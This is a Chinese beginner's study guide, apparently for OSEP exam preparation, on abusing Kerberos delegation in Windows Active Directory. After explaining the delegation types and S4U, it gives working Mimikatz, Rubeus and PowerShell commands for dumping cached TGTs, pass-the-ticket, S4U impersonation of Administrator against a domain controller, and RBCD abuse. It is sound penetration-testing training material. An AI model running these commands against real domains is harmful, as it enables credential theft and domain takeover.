# Kerberos委派 - 新手章节指南

## 这个目录是干什么的？

Kerberos 委派是 Windows 域环境中的一个功能，允许服务代表用户访问其他服务。但如果配置不当，可以被攻击者利用来提升权限。这是 OSEP 的高级内容。

---

## 为什么要学这个？

```
Kerberos 委派攻击的价值：
├── 可以冒充任意用户
├── 包括域管理员
├── 不需要知道用户密码
├── 是域渗透的高级技术
└── OSEP 考试重点

现实场景：
├── 你发现一台配置了委派的服务器
├── 获得了该服务器的控制权
├── 利用委派冒充域管理员
├── 访问域控制器
└── 完全控制域
```

## 通俗理解核心概念

### 什么是 Kerberos 委派？

```
委派的目的：
├── 用户访问 Web 服务器
├── Web 服务器需要代表用户访问数据库
├── 数据库需要知道是哪个用户在访问
├── 委派让 Web 服务器可以"冒充"用户
└── 这是合法的业务需求

类比：
├── 你（用户）去银行（Web 服务器）
├── 银行需要帮你查询股票（数据库）
├── 股票系统需要知道是你在查询
├── 委派 = 银行可以代表你查询
└── 股票系统看到的是"你"在查询
```

### 三种委派类型

```
1. 无约束委派（Unconstrained Delegation）
├── 服务可以冒充任何用户
├── 访问任何服务
├── 最危险的配置
├── 服务器会缓存用户的 TGT
└── 攻击者可以提取并使用这些 TGT

2. 约束委派（Constrained Delegation）
├── 服务只能冒充用户
├── 访问指定的服务
├── 比无约束委派安全一些
├── 但仍然可以被利用
└── 使用 S4U2Self 和 S4U2Proxy

3. 基于资源的约束委派（RBCD）
├── Resource-Based Constrained Delegation
├── 由目标服务控制谁可以委派
├── 而不是由源服务控制
├── 可以被利用来提权
└── 需要对目标有写权限
```

### S4U2Self 和 S4U2Proxy

```
S4U2Self（Service for User to Self）：
├── 服务为用户请求票据
├── 即使用户没有访问过该服务
├── 可以为任意用户获取票据
└── 用于约束委派的第一步

S4U2Proxy（Service for User to Proxy）：
├── 使用 S4U2Self 获取的票据
├── 请求访问目标服务的票据
├── 实现"冒充"用户访问目标
└── 用于约束委派的第二步

攻击流程：
1. 获得配置了约束委派的服务账户
2. 使用 S4U2Self 为域管理员获取票据
3. 使用 S4U2Proxy 获取访问目标服务的票据
4. 使用该票据访问目标服务
```

## 实操环境搭建

### 测试环境

```
推荐配置：
├── Windows Server 域控制器
├── 配置了无约束委派的服务器
├── 配置了约束委派的服务账户
├── 用于测试 RBCD 的计算机账户
└── Rubeus 工具

配置无约束委派：
├── 在 AD 用户和计算机中
├── 找到计算机账户
├── 属性 -> 委派
├── 选择"信任此计算机来委派任何服务"
└── 这就是无约束委派
```

## 实践任务清单

### 任务1：枚举委派配置

```powershell
# 使用 PowerView 枚举无约束委派
Get-DomainComputer -Unconstrained

# 枚举约束委派
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# 使用 ADModule
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true}
```

### 任务2：利用无约束委派

```powershell
# 在配置了无约束委派的服务器上
# 提取缓存的 TGT

# 使用 Mimikatz
sekurlsa::tickets /export

# 使用 Rubeus
Rubeus.exe dump

# 如果有域管理员的 TGT
# 可以使用 Pass-the-Ticket
Rubeus.exe ptt /ticket:base64_ticket
```

### 任务3：利用约束委派

```powershell
# 假设服务账户 svc_sql 配置了约束委派
# 可以委派到 cifs/dc.corp.local

# 使用 Rubeus 执行 S4U 攻击
Rubeus.exe s4u /user:svc_sql /rc4:hash /impersonateuser:Administrator /msdsspn:cifs/dc.corp.local /ptt

# 现在可以访问 DC 的文件共享
dir \\dc.corp.local\c$
```

### 任务4：利用 RBCD

```powershell
# 如果你对目标计算机有写权限
# 可以配置 RBCD

# 1. 创建一个计算机账户（或使用已有的）
New-MachineAccount -MachineAccount YOURPC -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# 2. 配置 RBCD
Set-ADComputer target_computer -PrincipalsAllowedToDelegateToAccount YOURPC$

# 3. 使用 Rubeus 获取票据
Rubeus.exe s4u /user:YOURPC$ /rc4:hash /impersonateuser:Administrator /msdsspn:cifs/target_computer /ptt
```
